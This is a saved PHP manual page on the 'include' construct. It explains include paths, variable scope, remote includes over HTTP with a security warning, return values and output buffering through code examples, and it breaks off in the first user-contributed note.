<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 

  <title>PHP: include - Manual </title>

 <link rel="shortcut icon" href="http://php.net/favicon.ico">
 <link rel="search" type="application/opensearchdescription+xml" href="http://php.net/phpnetimprovedsearch.src" title="Add PHP.net search">
 <link rel="alternate" type="application/atom+xml" href="http://php.net/releases/feed.php" title="PHP Release feed">
 <link rel="alternate" type="application/atom+xml" href="http://php.net/feed.atom" title="PHP: Hypertext Preprocessor">

 <link rel="canonical" href="http://php.net/manual/en/function.include.php">
 <link rel="shorturl" href="http://php.net/include">
 <link rel="alternate" href="http://php.net/include" hreflang="x-default">

 <link rel="contents" href="http://php.net/manual/en/index.php">
 <link rel="index" href="http://php.net/manual/en/language.control-structures.php">
 <link rel="prev" href="http://php.net/manual/en/function.require.php">
 <link rel="next" href="http://php.net/manual/en/function.require-once.php">

 <link rel="alternate" href="http://php.net/manual/en/function.include.php" hreflang="en">
 <link rel="alternate" href="http://php.net/manual/pt_BR/function.include.php" hreflang="pt_BR">
 <link rel="alternate" href="http://php.net/manual/zh/function.include.php" hreflang="zh">
 <link rel="alternate" href="http://php.net/manual/fr/function.include.php" hreflang="fr">
 <link rel="alternate" href="http://php.net/manual/de/function.include.php" hreflang="de">
 <link rel="alternate" href="http://php.net/manual/ja/function.include.php" hreflang="ja">
 <link rel="alternate" href="http://php.net/manual/ro/function.include.php" hreflang="ro">
 <link rel="alternate" href="http://php.net/manual/ru/function.include.php" hreflang="ru">
 <link rel="alternate" href="http://php.net/manual/es/function.include.php" hreflang="es">
 <link rel="alternate" href="http://php.net/manual/tr/function.include.php" hreflang="tr">

<link rel="stylesheet" type="text/css" href="http://php.net/cached.php?t=1421837618&amp;f=/fonts/Fira/fira.css" media="screen">
<link rel="stylesheet" type="text/css" href="http://php.net/cached.php?t=1421837618&amp;f=/fonts/Font-Awesome/css/fontello.css" media="screen">
<link rel="stylesheet" type="text/css" href="http://php.net/cached.php?t=1478800802&amp;f=/styles/theme-base.css" media="screen">
<link rel="stylesheet" type="text/css" href="http://php.net/cached.php?t=1449787206&amp;f=/styles/theme-medium.css" media="screen">

 <!--[if lte IE 7]>
 <link rel="stylesheet" type="text/css" href="http://php.net/styles/workarounds.ie7.css" media="screen">
 <![endif]-->

 <!--[if lte IE 8]>
 <script type="text/javascript">
  window.brokenIE = true;
 </script>
 <![endif]-->

 <!--[if lte IE 9]>
 <link rel="stylesheet" type="text/css" href="http://php.net/styles/workarounds.ie9.css" media="screen">
 <![endif]-->

 <!--[if IE]>
 <script type="text/javascript" src="http://php.net/js/ext/html5.js"></script>
 <![endif]-->

 <base href="http://php.net/manual/en/function.include.php">

</head>
<body class="docs ">

<nav id="head-nav" class="navbar navbar-fixed-top">
  <div class="navbar-inner clearfix">
    <a href="/" class="brand"><img src="/images/logos/php-logo.svg" width="48" height="24" alt="php"></a>
    <div id="mainmenu-toggle-overlay"></div>
    <input type="checkbox" id="mainmenu-toggle">
    <ul class="nav">
      <li class=""><a href="/downloads">Downloads</a></li>
      <li class="active"><a href="/docs.php">Documentation</a></li>
      <li class=""><a href="/get-involved" >Get Involved</a></li>
      <li class=""><a href="/support">Help</a></li>
    </ul>
    <form class="navbar-search" id="topsearch" action="/search.php">
      <input type="hidden" name="show" value="quickref">
      <input type="search" name="pattern" class="search-query" placeholder="Search" accesskey="s">
    </form>
  </div>
  <div id="flash-message"></div>
</nav>
<nav id="trick"><div><dl>
<dt><a href='/manual/en/getting-started.php'>Getting Started</a></dt>
	<dd><a href='/manual/en/introduction.php'>Introduction</a></dd>
	<dd><a href='/manual/en/tutorial.php'>A simple tutorial</a></dd>
<dt><a href='/manual/en/langref.php'>Language Reference</a></dt>
	<dd><a href='/manual/en/language.basic-syntax.php'>Basic syntax</a></dd>
	<dd><a href='/manual/en/language.types.php'>Types</a></dd>
	<dd><a href='/manual/en/language.variables.php'>Variables</a></dd>
	<dd><a href='/manual/en/language.constants.php'>Constants</a></dd>
	<dd><a href='/manual/en/language.expressions.php'>Expressions</a></dd>
	<dd><a href='/manual/en/language.operators.php'>Operators</a></dd>
	<dd><a href='/manual/en/language.control-structures.php'>Control Structures</a></dd>
	<dd><a href='/manual/en/language.functions.php'>Functions</a></dd>
	<dd><a href='/manual/en/language.oop5.php'>Classes and Objects</a></dd>
	<dd><a href='/manual/en/language.namespaces.php'>Namespaces</a></dd>
	<dd><a href='/manual/en/language.errors.php'>Errors</a></dd>
	<dd><a href='/manual/en/language.exceptions.php'>Exceptions</a></dd>
	<dd><a href='/manual/en/language.generators.php'>Generators</a></dd>
	<dd><a href='/manual/en/language.references.php'>References Explained</a></dd>
	<dd><a href='/manual/en/reserved.variables.php'>Predefined Variables</a></dd>
	<dd><a href='/manual/en/reserved.exceptions.php'>Predefined Exceptions</a></dd>
	<dd><a href='/manual/en/reserved.interfaces.php'>Predefined Interfaces and Classes</a></dd>
	<dd><a href='/manual/en/context.php'>Context options and parameters</a></dd>
	<dd><a href='/manual/en/wrappers.php'>Supported Protocols and Wrappers</a></dd>
</dl>
<dl>
<dt><a href='/manual/en/security.php'>Security</a></dt>
	<dd><a href='/manual/en/security.intro.php'>Introduction</a></dd>
	<dd><a href='/manual/en/security.general.php'>General considerations</a></dd>
	<dd><a href='/manual/en/security.cgi-bin.php'>Installed as CGI binary</a></dd>
	<dd><a href='/manual/en/security.apache.php'>Installed as an Apache module</a></dd>
	<dd><a href='/manual/en/security.sessions.php'>Session Security</a></dd>
	<dd><a href='/manual/en/security.filesystem.php'>Filesystem Security</a></dd>
	<dd><a href='/manual/en/security.database.php'>Database Security</a></dd>
	<dd><a href='/manual/en/security.errors.php'>Error Reporting</a></dd>
	<dd><a href='/manual/en/security.globals.php'>Using Register Globals</a></dd>
	<dd><a href='/manual/en/security.variables.php'>User Submitted Data</a></dd>
	<dd><a href='/manual/en/security.magicquotes.php'>Magic Quotes</a></dd>
	<dd><a href='/manual/en/security.hiding.php'>Hiding PHP</a></dd>
	<dd><a href='/manual/en/security.current.php'>Keeping Current</a></dd>
<dt><a href='/manual/en/features.php'>Features</a></dt>
	<dd><a href='/manual/en/features.http-auth.php'>HTTP authentication with PHP</a></dd>
	<dd><a href='/manual/en/features.cookies.php'>Cookies</a></dd>
	<dd><a href='/manual/en/features.sessions.php'>Sessions</a></dd>
	<dd><a href='/manual/en/features.xforms.php'>Dealing with XForms</a></dd>
	<dd><a href='/manual/en/features.file-upload.php'>Handling file uploads</a></dd>
	<dd><a href='/manual/en/features.remote-files.php'>Using remote files</a></dd>
	<dd><a href='/manual/en/features.connection-handling.php'>Connection handling</a></dd>
	<dd><a href='/manual/en/features.persistent-connections.php'>Persistent Database Connections</a></dd>
	<dd><a href='/manual/en/features.safe-mode.php'>Safe Mode</a></dd>
	<dd><a href='/manual/en/features.commandline.php'>Command line usage</a></dd>
	<dd><a href='/manual/en/features.gc.php'>Garbage Collection</a></dd>
	<dd><a href='/manual/en/features.dtrace.php'>DTrace Dynamic Tracing</a></dd>
</dl>
<dl>
<dt><a href='/manual/en/funcref.php'>Function Reference</a></dt>
	<dd><a href='/manual/en/refs.basic.php.php'>Affecting PHP's Behaviour</a></dd>
	<dd><a href='/manual/en/refs.utilspec.audio.php'>Audio Formats Manipulation</a></dd>
	<dd><a href='/manual/en/refs.remote.auth.php'>Authentication Services</a></dd>
	<dd><a href='/manual/en/refs.utilspec.cmdline.php'>Command Line Specific Extensions</a></dd>
	<dd><a href='/manual/en/refs.compression.php'>Compression and Archive Extensions</a></dd>
	<dd><a href='/manual/en/refs.creditcard.php'>Credit Card Processing</a></dd>
	<dd><a href='/manual/en/refs.crypto.php'>Cryptography Extensions</a></dd>
	<dd><a href='/manual/en/refs.database.php'>Database Extensions</a></dd>
	<dd><a href='/manual/en/refs.calendar.php'>Date and Time Related Extensions</a></dd>
	<dd><a href='/manual/en/refs.fileprocess.file.php'>File System Related Extensions</a></dd>
	<dd><a href='/manual/en/refs.international.php'>Human Language and Character Encoding Support</a></dd>
	<dd><a href='/manual/en/refs.utilspec.image.php'>Image Processing and Generation</a></dd>
	<dd><a href='/manual/en/refs.remote.mail.php'>Mail Related Extensions</a></dd>
	<dd><a href='/manual/en/refs.math.php'>Mathematical Extensions</a></dd>
	<dd><a href='/manual/en/refs.utilspec.nontext.php'>Non-Text MIME Output</a></dd>
	<dd><a href='/manual/en/refs.fileprocess.process.php'>Process Control Extensions</a></dd>
	<dd><a href='/manual/en/refs.basic.other.php'>Other Basic Extensions</a></dd>
	<dd><a href='/manual/en/refs.remote.other.php'>Other Services</a></dd>
	<dd><a href='/manual/en/refs.search.php'>Search Engine Extensions</a></dd>
	<dd><a href='/manual/en/refs.utilspec.server.php'>Server Specific Extensions</a></dd>
	<dd><a href='/manual/en/refs.basic.session.php'>Session Extensions</a></dd>
	<dd><a href='/manual/en/refs.basic.text.php'>Text Processing</a></dd>
	<dd><a href='/manual/en/refs.basic.vartype.php'>Variable and Type Related Extensions</a></dd>
	<dd><a href='/manual/en/refs.webservice.php'>Web Services</a></dd>
	<dd><a href='/manual/en/refs.utilspec.windows.php'>Windows Only Extensions</a></dd>
	<dd><a href='/manual/en/refs.xml.php'>XML Manipulation</a></dd>
	<dd><a href='/manual/en/refs.ui.php'>GUI Extensions</a></dd>
</dl>
<dl>
<dt>Keyboard Shortcuts</dt><dt>?</dt>
<dd>This help</dd>
<dt>j</dt>
<dd>Next menu item</dd>
<dt>k</dt>
<dd>Previous menu item</dd>
<dt>g p</dt>
<dd>Previous man page</dd>
<dt>g n</dt>
<dd>Next man page</dd>
<dt>G</dt>
<dd>Scroll to bottom</dd>
<dt>g g</dt>
<dd>Scroll to top</dd>
<dt>g h</dt>
<dd>Goto homepage</dd>
<dt>g s</dt>
<dd>Goto search<br>(current page)</dd>
<dt>/</dt>
<dd>Focus search box</dd>
</dl></div></nav>
<div id="goto">
    <div class="search">
         <div class="text"></div>
         <div class="results"><ul></ul></div>
   </div>
</div>

  <div id="breadcrumbs" class="clearfix">
    <div id="breadcrumbs-inner">
          <div class="next">
        <a href="function.require-once.php">
          require_once &raquo;
        </a>
      </div>
              <div class="prev">
        <a href="function.require.php">
          &laquo; require        </a>
      </div>
          <ul>
            <li><a href='index.php'>PHP Manual</a></li>      <li><a href='langref.php'>Language Reference</a></li>      <li><a href='language.control-structures.php'>Control Structures</a></li>      </ul>
    </div>
  </div>




<div id="layout" class="clearfix">
  <section id="layout-content">
  <div class="page-tools">
    <div class="change-language">
      <form action="/manual/change.php" method="get" id="changelang" name="changelang">
        <fieldset>
          <label for="changelang-langs">Change language:</label>
          <select onchange="document.changelang.submit()" name="page" id="changelang-langs">
            <option value='en/function.include.php' selected="selected">English</option>
            <option value='pt_BR/function.include.php'>Brazilian Portuguese</option>
            <option value='zh/function.include.php'>Chinese (Simplified)</option>
            <option value='fr/function.include.php'>French</option>
            <option value='de/function.include.php'>German</option>
            <option value='ja/function.include.php'>Japanese</option>
            <option value='ro/function.include.php'>Romanian</option>
            <option value='ru/function.include.php'>Russian</option>
            <option value='es/function.include.php'>Spanish</option>
            <option value='tr/function.include.php'>Turkish</option>
            <option value="help-translate.php">Other</option>
          </select>
        </fieldset>
      </form>
    </div>
    <div class="edit-bug">
      <a href="https://edit.php.net/?project=PHP&amp;perm=en/function.include.php">Edit</a>
      <a href="https://bugs.php.net/report.php?bug_type=Documentation+problem&amp;manpage=function.include">Report a Bug</a>
    </div>
  </div><div id="function.include" class="sect1">
 <h2 class="title">include</h2>
 <p class="verinfo">(PHP 4, PHP 5, PHP 7)</p>
 <p class="simpara">
  The <em>include</em> statement includes and evaluates
  the specified file.
 </p>
 <p class="simpara">
  The documentation below also applies to <span class="function"><a href="function.require.php" class="function">require</a></span>.
 </p>
 <p class="simpara">
  Files are included based on the file path given or, if none is given, the
  <a href="ini.core.php#ini.include-path" class="link">include_path</a> specified. If the file
  isn&#039;t found in the <a href="ini.core.php#ini.include-path" class="link">include_path</a>,
  <em>include</em> will finally check in the calling script&#039;s own
  directory and the current working directory before failing. The
  <em>include</em> construct will emit a
  <a href="" class="link">warning</a> if
  it cannot find a file; this is different behavior from
  <span class="function"><a href="function.require.php" class="function">require</a></span>, which will emit a
  <a href="" class="link">fatal error</a>.
 </p>
 <p class="simpara">
  If a path is defined — whether absolute (starting with a drive letter
  or <em>\</em> on Windows, or <em>/</em> on Unix/Linux
  systems) or relative to the current directory (starting with
  <em>.</em> or <em>..</em>) — the
  <a href="ini.core.php#ini.include-path" class="link">include_path</a> will be ignored
  altogether.  For example, if a filename begins with <em>../</em>,
  the parser will look in the parent directory to find the requested file.
 </p>
 <p class="simpara">
  For more information on how PHP handles including files and the include path,
  see the documentation for <a href="ini.core.php#ini.include-path" class="link">include_path</a>.
 </p>
 <p class="simpara">
  When a file is included, the code it contains inherits the
  <a href="language.variables.scope.php" class="link">variable scope</a> of the
  line on which the include occurs.  Any variables available at that line
  in the calling file will be available within the called file, from that
  point forward.
  However, all functions and classes defined in the included file have the
  global scope.
 </p>
 <p class="para">
  <div class="example" id="example-122">
   <p><strong>Example #1 Basic <em>include</em> example</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'green'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$fruit&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'apple'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />test.php<br /><span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #DD0000">"A&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #DD0000">&nbsp;</span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;A<br /><br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />echo&nbsp;</span><span style="color: #DD0000">"A&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #DD0000">&nbsp;</span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;A&nbsp;green&nbsp;apple<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="simpara">
  If the include occurs inside a function within the calling file,
  then all of the code contained in the called file will behave as
  though it had been defined inside that function.  So, it will follow
  the variable scope of that function.
  An exception to this rule are <a href="language.constants.predefined.php" class="link">magic constants</a> which are
  evaluated by the parser before the include occurs.
 </p>
 <p class="para">
  <div class="example" id="example-123">
   <p><strong>Example #2 Including within functions</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">function&nbsp;</span><span style="color: #0000BB">foo</span><span style="color: #007700">()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;include&nbsp;</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"A&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #DD0000">&nbsp;</span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">/*&nbsp;vars.php&nbsp;is&nbsp;in&nbsp;the&nbsp;scope&nbsp;of&nbsp;foo()&nbsp;so&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<br />*&nbsp;$fruit&nbsp;is&nbsp;NOT&nbsp;available&nbsp;outside&nbsp;of&nbsp;this&nbsp;&nbsp;*<br />*&nbsp;scope.&nbsp;&nbsp;$color&nbsp;is&nbsp;because&nbsp;we&nbsp;declared&nbsp;it&nbsp;*<br />*&nbsp;as&nbsp;global.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/<br /><br /></span><span style="color: #0000BB">foo</span><span style="color: #007700">();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;A&nbsp;green&nbsp;apple<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #DD0000">"A&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #DD0000">&nbsp;</span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;A&nbsp;green<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="simpara">
  When a file is included, parsing drops out of PHP mode and
  into HTML mode at the beginning of the target file, and resumes
  again at the end.  For this reason, any code inside the target
  file which should be executed as PHP code must be enclosed within
  <a href="language.basic-syntax.phpmode.php" class="link">valid PHP start
  and end tags</a>.
 </p>
 <p class="simpara">
  If &quot;<a href="filesystem.configuration.php#ini.allow-url-include" class="link">URL include wrappers</a>&quot;
  are enabled in PHP,
  you can specify the file to be included using a URL (via HTTP or
  other supported wrapper - see <a href="wrappers.php" class="xref">Supported Protocols and Wrappers</a> for a list
  of protocols) instead of a local pathname.  If the target server interprets
  the target file as PHP code, variables may be passed to the included
  file using a URL request string as used with HTTP GET.  This is
  not strictly speaking the same thing as including the file and having
  it inherit the parent file&#039;s variable scope; the script is actually
  being run on the remote server and the result is then being
  included into the local script.
 </p>
 <p class="para">
  <div class="example" id="example-124">
   <p><strong>Example #3 <em>include</em> through HTTP</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #FF8000">/*&nbsp;This&nbsp;example&nbsp;assumes&nbsp;that&nbsp;www.example.com&nbsp;is&nbsp;configured&nbsp;to&nbsp;parse&nbsp;.php<br />*&nbsp;files&nbsp;and&nbsp;not&nbsp;.txt&nbsp;files.&nbsp;Also,&nbsp;'Works'&nbsp;here&nbsp;means&nbsp;that&nbsp;the&nbsp;variables<br />*&nbsp;$foo&nbsp;and&nbsp;$bar&nbsp;are&nbsp;available&nbsp;within&nbsp;the&nbsp;included&nbsp;file.&nbsp;*/<br /><br />//&nbsp;Won't&nbsp;work;&nbsp;file.txt&nbsp;wasn't&nbsp;handled&nbsp;by&nbsp;www.example.com&nbsp;as&nbsp;PHP<br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'http://www.example.com/file.txt?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">//&nbsp;Won't&nbsp;work;&nbsp;looks&nbsp;for&nbsp;a&nbsp;file&nbsp;named&nbsp;'file.php?foo=1&amp;bar=2'&nbsp;on&nbsp;the<br />//&nbsp;local&nbsp;filesystem.<br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">//&nbsp;Works.<br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'http://www.example.com/file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">$foo&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$bar&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">2</span><span style="color: #007700">;<br />include&nbsp;</span><span style="color: #DD0000">'file.txt'</span><span style="color: #007700">;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;Works.<br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'file.php'</span><span style="color: #007700">;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;Works.<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <div class="warning"><strong class="warning">Warning</strong>
  <h1 class="title">Security warning</h1>
  <p class="para">
   Remote file may be processed at the remote server (depending on the file
   extension and the fact if the remote server runs PHP or not) but it still
   has to produce a valid PHP script because it will be processed at the
   local server. If the file from the remote server should be processed
   there and outputted only, <span class="function"><a href="function.readfile.php" class="function">readfile()</a></span> is much better
   function to use. Otherwise, special care should be taken to secure the
   remote script to produce a valid and desired code.
  </p>
 </div>
 <p class="para">
  See also <a href="features.remote-files.php" class="link">Remote files</a>,
  <span class="function"><a href="function.fopen.php" class="function">fopen()</a></span> and <span class="function"><a href="function.file.php" class="function">file()</a></span> for related
  information.
 </p>
 <p class="simpara">
  Handling Returns: <em>include</em> returns
  <em>FALSE</em> on failure and raises a warning. Successful
  includes, unless overridden by the included file, return
  <em>1</em>. It is possible to execute a <span class="function"><a href="function.return.php" class="function">return</a></span>
  statement inside an included file in order to terminate processing in
  that file and return to the script which called it.  Also, it&#039;s possible
  to return values from included files. You can take the value of the
  include call as you would for a normal function.  This is not, however,
  possible when including remote files unless the output of the remote
  file has <a href="language.basic-syntax.phpmode.php" class="link">valid PHP start
  and end tags</a> (as with any local file).  You can declare the
  needed variables within those tags and they will be introduced at
  whichever point the file was included.
 </p>
 <p class="para">
  Because <em>include</em> is a special language construct,
  parentheses are not needed around its argument. Take care when comparing
  return value.
  <div class="example" id="example-125">
   <p><strong>Example #4 Comparing return value of include</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #FF8000">//&nbsp;won't&nbsp;work,&nbsp;evaluated&nbsp;as&nbsp;include(('vars.php')&nbsp;==&nbsp;TRUE),&nbsp;i.e.&nbsp;include('')<br /></span><span style="color: #007700">if&nbsp;(include(</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">)&nbsp;==&nbsp;</span><span style="color: #0000BB">TRUE</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">//&nbsp;works<br /></span><span style="color: #007700">if&nbsp;((include&nbsp;</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">)&nbsp;==&nbsp;</span><span style="color: #0000BB">TRUE</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="para">
  <div class="example" id="example-126">
   <p><strong>Example #5 <em>include</em> and the <span class="function"><a href="function.return.php" class="function">return</a></span> statement</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
return.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br />return&nbsp;</span><span style="color: #0000BB">$var</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />noreturn.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />testreturns.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$foo&nbsp;</span><span style="color: #007700">=&nbsp;include&nbsp;</span><span style="color: #DD0000">'return.php'</span><span style="color: #007700">;<br /><br />echo&nbsp;</span><span style="color: #0000BB">$foo</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;prints&nbsp;'PHP'<br /><br /></span><span style="color: #0000BB">$bar&nbsp;</span><span style="color: #007700">=&nbsp;include&nbsp;</span><span style="color: #DD0000">'noreturn.php'</span><span style="color: #007700">;<br /><br />echo&nbsp;</span><span style="color: #0000BB">$bar</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;prints&nbsp;1<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="simpara">
  <em>$bar</em> is the value <em>1</em> because the include
  was successful.  Notice the difference between the above examples.  The first uses
  <span class="function"><a href="function.return.php" class="function">return</a></span> within the included file while the other does not.
  If the file can&#039;t be included, <strong><code>FALSE</code></strong> is returned and
  <strong><code>E_WARNING</code></strong> is issued.
 </p>
 <p class="para">
  If there are functions defined in the included file, they can be used in the
  main file independent if they are before <span class="function"><a href="function.return.php" class="function">return</a></span> or after.
  If the file is included twice, PHP 5 issues fatal error because functions
  were already declared, while PHP 4 doesn&#039;t complain about functions
  defined after <span class="function"><a href="function.return.php" class="function">return</a></span>.
  It is recommended to use <span class="function"><a href="function.include-once.php" class="function">include_once</a></span> instead of
  checking if the file was already included and conditionally return inside
  the included file.
 </p>
 <p class="simpara">
  Another way to &quot;include&quot; a PHP file into a variable is to capture the
  output by using the <a href="ref.outcontrol.php" class="link">Output Control
  Functions</a> with <em>include</em>. For example:
 </p>
 <p class="para">
  <div class="example" id="example-127">
   <p><strong>Example #6 Using output buffering to include a PHP file into a string</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />$string&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">'somefile.php'</span><span style="color: #007700">);<br /><br />function&nbsp;</span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(</span><span style="color: #0000BB">is_file</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ob_start</span><span style="color: #007700">();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include&nbsp;</span><span style="color: #0000BB">$filename</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">ob_get_clean</span><span style="color: #007700">();<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="para">
  In order to automatically include files within scripts, see also the
  <a href="ini.core.php#ini.auto-prepend-file" class="link">auto_prepend_file</a> and
  <a href="ini.core.php#ini.auto-append-file" class="link">auto_append_file</a>
  configuration options in <var class="filename">php.ini</var>.
 </p>

 <blockquote class="note"><p><strong class="note">Note</strong>: <span class="simpara">Because this is a
language construct and not a function, it cannot be called using
<a href="functions.variable-functions.php" class="link">variable functions</a>.</span>
</p></blockquote>

 <p class="simpara">
  See also <span class="function"><a href="function.require.php" class="function">require</a></span>, <span class="function"><a href="function.require-once.php" class="function">require_once</a></span>,
  <span class="function"><a href="function.include-once.php" class="function">include_once</a></span>, <span class="function"><a href="function.get-included-files.php" class="function">get_included_files()</a></span>,
  <span class="function"><a href="function.readfile.php" class="function">readfile()</a></span>, <span class="function"><a href="function.virtual.php" class="function">virtual()</a></span>, and
  <a href="ini.core.php#ini.include-path" class="link">include_path</a>.
 </p>
</div>
<section id="usernotes">
 <div class="head">
  <span class="action"><a href="/manual/add-note.php?sect=function.include&amp;redirect=http://php.net/manual/en/function.include.php"><img src='/images/notes-add@2x.png' alt='add a note' width='12' height='12'> <small>add a note</small></a></span>
  <h3 class="title">User Contributed Notes <span class="count">20 notes</span></h3>
 </div><div id="allnotes">
  <div class="note" id="86842">  <div class="votes">
    <div id="Vu86842">
    <a href="/manual/vote-note.php?id=86842&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd86842">
    <a href="/manual/vote-note.php?id=86842&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V86842" title="63% like this...">
    79
    </div>
  </div>
  <a href="#86842" class="name">
  <strong class="user"><em>snowyurik at gmail dot com</em></strong></a><a class="genanchor" href="#86842"> &para;</a><div class="date" title="2008-11-05 10:49"><strong>9 years ago</strong></div>
  <div class="text" id="Hcom86842">
<div class="phpcode"><code><span class="html">
This might be useful:<br /><span class="default">&lt;?php<br /></span><span class="keyword">include </span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">].</span><span class="string">"/lib/sample.lib.php"</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span>So you can move script anywhere in web-project tree without changes.</span>
